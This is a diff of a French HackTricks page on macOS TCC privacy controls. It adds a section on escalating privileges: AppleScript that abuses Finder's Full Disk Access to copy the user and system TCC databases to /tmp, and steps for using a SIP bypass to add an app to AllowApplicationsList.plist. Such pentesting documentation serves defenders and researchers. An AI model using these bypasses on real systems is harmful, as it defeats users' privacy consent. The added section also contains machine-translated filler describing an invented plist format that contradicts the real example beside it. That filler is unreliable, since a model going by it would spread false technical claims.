@@ -16,7 +16,7 @@
 
 **TCC (Transparency, Consent, and Control)** est un mécanisme dans macOS pour **limiter et contrôler l'accès des applications à certaines fonctionnalités**, généralement dans une perspective de confidentialité. Cela peut inclure des services de localisation, des contacts, des photos, un microphone, une caméra, l'accessibilité, l'accès complet au disque et bien plus encore.
 
-Du point de vue de l'utilisateur, TCC est visible **lorsqu'une application souhaite accéder à l'une des fonctionnalités protégées par TCC**. Lorsque cela se produit, **l'utilisateur est invité** avec une boîte de dialogue lui demandant s'il souhaite autoriser l'accès ou non.
+Du point de vue de l'utilisateur, TCC est visible **lorsqu'une application souhaite accéder à l'une des fonctionnalités protégées par TCC**. Lorsque cela se produit, **l'utilisateur reçoit une boîte de dialogue** lui demandant s'il souhaite autoriser l'accès ou non.
 
 Il est également possible d'**accorder aux applications l'accès** aux fichiers par **des intentions explicites** de la part des utilisateurs, par exemple lorsque l'utilisateur **glisse et dépose un fichier dans un programme** (évidemment, le programme doit y avoir accès).
 
@@ -44,7 +44,7 @@ La base de données TCC dans **iOS** se trouve dans **`/private/var/mobile/Libra
 
 Il existe une **troisième** base de données TCC dans **`/var/db/locationd/clients.plist`** pour indiquer les clients autorisés à accéder aux services de localisation.
 
-De plus, un processus avec un **accès complet au disque** peut modifier la base de données en mode utilisateur. Maintenant, une application a également besoin de **FDA** pour lire la base de données.
+De plus, un processus avec un **accès complet au disque** peut modifier la base de données en mode utilisateur. Maintenant, une application a également besoin de **FDA** ou de **`kTCCServiceEndpointSecurityClient`** pour lire la base de données (et modifier les bases de données des utilisateurs).
 
 {% hint style="info" %}
 L'interface utilisateur du **centre de notifications** peut apporter des **modifications dans la base de données TCC du système**:
@@ -114,18 +114,22 @@ En vérifiant les deux bases de données, vous pouvez vérifier les autorisation
 
 * La valeur **`auth_value`** peut avoir différentes valeurs : denied(0), unknown(1), allowed(2) ou limited(3).
 * La raison **`auth_reason`** peut prendre les valeurs suivantes : Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12).
-* Pour plus d'informations sur les **autres champs** du tableau, [**consultez cet article de blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).
+* Pour plus d'informations sur les **autres champs** de la table, [**consultez cet article de blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).
 
 {% hint style="info" %}
 Certaines autorisations TCC sont : kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Il n'existe pas de liste publique qui les définit toutes, mais vous pouvez consulter cette [**liste des autorisations connues**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).
 
-L'accès complet au disque est nommé **`kTCCServiceSystemPolicyAllFiles`** et **`kTCCServiceAppleEvents`** permet à l'application d'envoyer des événements à d'autres applications couramment utilisées pour **automatiser des tâches**. De plus, **`kTCCServiceSystemPolicySysAdminFiles`** permet de **modifier** l'attribut **`NFSHomeDirectory`** d'un utilisateur, ce qui modifie son dossier personnel et permet donc de **contourner TCC**.
+**Full Disk Access** est nommé **`kTCCServiceSystemPolicyAllFiles`** et **`kTCCServiceAppleEvents`** permet à l'application d'envoyer des événements à d'autres applications couramment utilisées pour **automatiser des tâches**.
+
+**kTCCServiceEndpointSecurityClient** est une autorisation TCC qui accorde également des privilèges élevés, notamment la possibilité d'écrire dans la base de données des utilisateurs.
+
+De plus, **`kTCCServiceSystemPolicySysAdminFiles`** permet de **modifier** l'attribut **`NFSHomeDirectory`** d'un utilisateur qui modifie son dossier personnel et permet donc de **contourner TCC**.
 {% endhint %}
 
 Vous pouvez également vérifier les **autorisations déjà accordées** aux applications dans `Préférences Système --> Sécurité et confidentialité --> Confidentialité --> Fichiers et dossiers`.
 
 {% hint style="success" %}
-Notez que même si l'une des bases de données se trouve dans le dossier de l'utilisateur, **les utilisateurs ne peuvent pas modifier directement ces bases de données en raison de SIP** (même si vous êtes root). La seule façon de configurer ou de modifier une nouvelle règle est via le panneau des Préférences Système ou les invites où l'application demande à l'utilisateur.
+Notez que même si l'une des bases de données se trouve dans le dossier personnel de l'utilisateur, **les utilisateurs ne peuvent pas modifier directement ces bases de données en raison de SIP** (même si vous êtes root). La seule façon de configurer ou de modifier une nouvelle règle est via le panneau des Préférences Système ou les invites où l'application demande à l'utilisateur.
 
 Cependant, n'oubliez pas que les utilisateurs peuvent **supprimer ou interroger des règles** en utilisant **`tccutil`**.
 {% endhint %}
@@ -137,55 +141,6 @@ tccutil reset All app.some.id
 
 # Reset the permissions granted to all apps
 tccutil reset All
-```
-### Privesc de la base de données utilisateur TCC à FDA
-
-En obtenant les **permissions d'écriture** sur la base de données utilisateur TCC, vous ne pouvez pas vous accorder vous-même les permissions **`FDA`**, seul celui qui réside dans la base de données système peut le faire.
-
-Mais vous pouvez vous accorder les **droits d'automatisation pour Finder**, et puisque Finder a les permissions **`FDA`**, vous les avez également.
-
-### De la contournement de SIP à la contournement de TCC
-
-Les bases de données **TCC** sont protégées par **SIP**, c'est pourquoi seuls les processus avec les **privilèges indiqués** pourront les modifier. Par conséquent, si un attaquant trouve un **contournement de SIP** sur un **fichier** (capable de modifier un fichier restreint par SIP), il pourra **supprimer la protection** d'une base de données TCC et s'accorder toutes les permissions TCC.
-
-Cependant, il existe une autre option pour abuser de ce **contournement de SIP pour contourner TCC**. Le fichier `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` est une liste d'applications autorisées qui nécessitent une exception TCC. Par conséquent, si un attaquant peut **supprimer la protection SIP** de ce fichier et ajouter sa **propre application**, cette application pourra contourner TCC.
-Par exemple, pour ajouter Terminal :
-```bash
-# Get needed info
-codesign -d -r- /System/Applications/Utilities/Terminal.app
-```
-AllowApplicationsList.plist:
-
-Ce fichier plist est utilisé par macOS pour gérer la liste des applications autorisées à accéder aux données sensibles protégées par le TCC (Transparency, Consent, and Control). Le TCC est un mécanisme de sécurité intégré à macOS qui permet aux utilisateurs de contrôler l'accès des applications à certaines fonctionnalités et données sensibles, telles que la caméra, le microphone, les contacts, les photos, etc.
-
-Dans ce fichier plist, vous pouvez spécifier les applications qui sont autorisées à accéder à ces données sensibles. Chaque application est répertoriée avec son identifiant de bundle (Bundle ID). Vous pouvez ajouter ou supprimer des entrées dans ce fichier pour personnaliser les autorisations d'accès des applications.
-
-Il est important de noter que la modification de ce fichier plist nécessite des privilèges d'administrateur. Par conséquent, seuls les utilisateurs disposant des droits d'administration peuvent apporter des modifications à ce fichier.
-
-Pour modifier le fichier AllowApplicationsList.plist, vous pouvez utiliser un éditeur de texte ou la commande `defaults` en ligne de commande. Assurez-vous de sauvegarder une copie du fichier d'origine avant d'apporter des modifications, au cas où vous auriez besoin de revenir à la configuration précédente.
-
-Une fois que vous avez modifié le fichier AllowApplicationsList.plist, vous devrez peut-être redémarrer votre système pour que les modifications prennent effet.
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-<key>Services</key>
-<dict>
-<key>SystemPolicyAllFiles</key>
-<array>
-<dict>
-<key>CodeRequirement</key>
-<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
-<key>IdentifierType</key>
-<string>bundleID</string>
-<key>Identifier</key>
-<string>com.apple.Terminal</string>
-</dict>
-</array>
-</dict>
-</dict>
-</plist>
 ```
 ### Vérifications de signature TCC
 
@@ -264,6 +219,145 @@ Notez également que si vous déplacez un fichier qui autorise l'UUID d'une appl
 
 L'attribut étendu `com.apple.macl` **ne peut pas être effacé** comme les autres attributs étendus car il est **protégé par SIP**. Cependant, comme [**expliqué dans cet article**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), il est possible de le désactiver en **compressant** le fichier, en le **supprimant** et en le **décompressant**.
 
+## Privilèges TCC et contournements
+
+### Élévation de privilèges de l'automatisation à la FDA
+
+**Finder** est une application qui **a toujours la FDA** (même si elle n'apparaît pas dans l'interface utilisateur), donc si vous avez des privilèges d'**automatisation** dessus, vous pouvez abuser de ses privilèges pour **lui faire effectuer certaines actions**.
+
+{% tabs %}
+{% tab title="Vol de la base de données TCC des utilisateurs" %}
+```applescript
+# This AppleScript will copy the system TCC database into /tmp
+osascript<<EOD
+tell application "Finder"
+set homeFolder to path to home folder as string
+set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
+set targetFolder to POSIX file "/tmp" as alias
+
+try
+duplicate file sourceFile to targetFolder with replacing
+on error errMsg
+display dialog "Error: " & errMsg
+end try
+end tell
+EOD
+```
+{% tab title="Vol de la base de données TCC du système" %}
+```applescript
+osascript<<EOD
+tell application "Finder"
+set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
+set targetFolder to POSIX file "/tmp" as alias
+
+try
+duplicate file sourceFile to targetFolder with replacing
+on error errMsg
+display dialog "Error: " & errMsg
+end try
+end tell
+EOD
+```
+{% endtab %}
+{% endtabs %}
+
+Vous pouvez exploiter cela pour **écrire votre propre base de données utilisateur TCC**.
+
+Voici l'invite TCC pour obtenir les privilèges d'automatisation sur Finder:
+
+<figure><img src="../../../../.gitbook/assets/image.png" alt="" width="244"><figcaption></figcaption></figure>
+
+### Élévation de privilèges de la base de données utilisateur TCC à FDA
+
+En obtenant les **permissions d'écriture** sur la **base de données utilisateur TCC**, vous ne pouvez pas vous accorder vous-même les permissions **`FDA`**, seul celui qui se trouve dans la base de données système peut le faire.
+
+Mais vous pouvez vous accorder les **droits d'automatisation pour Finder**, et abuser de la technique précédente pour passer à FDA.
+
+### Élévation de privilèges de FDA à permissions TCC
+
+Je ne pense pas que cela soit une véritable élévation de privilèges, mais au cas où vous le trouveriez utile : si vous contrôlez un programme avec FDA, vous pouvez **modifier la base de données utilisateur TCC et vous accorder n'importe quel accès**. Cela peut être utile comme technique de persistance au cas où vous pourriez perdre vos permissions FDA.
+
+### De la contournement de SIP à la contournement de TCC
+
+La base de données **TCC** du système est protégée par **SIP**, c'est pourquoi seuls les processus avec les **privilèges indiqués seront en mesure de la modifier**. Par conséquent, si un attaquant trouve un **contournement de SIP** sur un **fichier** (capable de modifier un fichier restreint par SIP), il pourra **supprimer la protection** d'une base de données TCC et s'accorder toutes les permissions TCC.
+
+Cependant, il existe une autre option pour exploiter ce **contournement de SIP pour contourner TCC**, le fichier `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` est une liste d'applications autorisées qui nécessitent une exception TCC. Par conséquent, si un attaquant peut **supprimer la protection SIP** de ce fichier et ajouter sa **propre application**, l'application pourra contourner TCC.\
+Par exemple, pour ajouter Terminal :
+```bash
+# Get needed info
+codesign -d -r- /System/Applications/Utilities/Terminal.app
+```
+AllowApplicationsList.plist:
+
+Ce fichier plist est utilisé par macOS pour gérer la liste des applications autorisées à accéder aux données protégées par le TCC (Transparency, Consent, and Control). Le TCC est un mécanisme de sécurité intégré à macOS qui protège les données sensibles de l'utilisateur en limitant l'accès des applications.
+
+Dans ce fichier, vous pouvez spécifier les applications qui sont autorisées à accéder à des données telles que la caméra, le microphone, les contacts, les calendriers, les photos, etc. Chaque application est répertoriée avec son identifiant de bundle (Bundle ID) et son niveau d'autorisation.
+
+Il est important de noter que la modification de ce fichier nécessite des privilèges d'administrateur et peut avoir des conséquences sur le fonctionnement des applications. Par conséquent, il est recommandé de faire preuve de prudence lors de la modification de ce fichier.
+
+Pour ajouter une application à la liste des autorisations, vous devez ajouter une nouvelle entrée avec le Bundle ID de l'application et spécifier le niveau d'autorisation souhaité. Les niveaux d'autorisation disponibles sont :
+
+- `TCCServiceCamera` : autorise l'accès à la caméra.
+- `TCCServiceMicrophone` : autorise l'accès au microphone.
+- `TCCServicePhotos` : autorise l'accès aux photos.
+- `TCCServiceContacts` : autorise l'accès aux contacts.
+- `TCCServiceCalendar` : autorise l'accès au calendrier.
+- `TCCServiceReminders` : autorise l'accès aux rappels.
+- `TCCServiceBluetoothPeripheral` : autorise l'accès aux périphériques Bluetooth.
+- `TCCServiceAppleEvents` : autorise l'accès aux événements AppleScript.
+
+Voici un exemple de structure de fichier AllowApplicationsList.plist :
+
+```xml
+<dict>
+    <key>TCCServiceCamera</key>
+    <dict>
+        <key>Allowed</key>
+        <true/>
+        <key>BundleId</key>
+        <string>com.example.app</string>
+    </dict>
+    <key>TCCServiceMicrophone</key>
+    <dict>
+        <key>Allowed</key>
+        <true/>
+        <key>BundleId</key>
+        <string>com.example.app</string>
+    </dict>
+</dict>
+```
+
+Dans cet exemple, l'application avec l'identifiant de bundle `com.example.app` est autorisée à accéder à la caméra et au microphone.
+
+Une fois que vous avez modifié le fichier AllowApplicationsList.plist, vous devez redémarrer le service TCC pour que les modifications prennent effet. Vous pouvez redémarrer le service TCC en utilisant la commande suivante dans le terminal :
+
+```bash
+killall -9 tccd
+```
+
+Après le redémarrage du service TCC, les applications spécifiées dans le fichier AllowApplicationsList.plist seront autorisées à accéder aux données protégées par le TCC.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>Services</key>
+<dict>
+<key>SystemPolicyAllFiles</key>
+<array>
+<dict>
+<key>CodeRequirement</key>
+<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
+<key>IdentifierType</key>
+<string>bundleID</string>
+<key>Identifier</key>
+<string>com.apple.Terminal</string>
+</dict>
+</array>
+</dict>
+</dict>
+</plist>
+```
 ### Contournements de TCC
 
 {% content-ref url="macos-tcc-bypasses/" %}
@@ -274,7 +368,8 @@ L'attribut étendu `com.apple.macl` **ne peut pas être effacé** comme les autr
 
 * [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
 * [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
-*   [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
+* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
+*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
 
 
 
@@ -282,8 +377,8 @@ L'attribut étendu `com.apple.macl` **ne peut pas être effacé** comme les autr
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
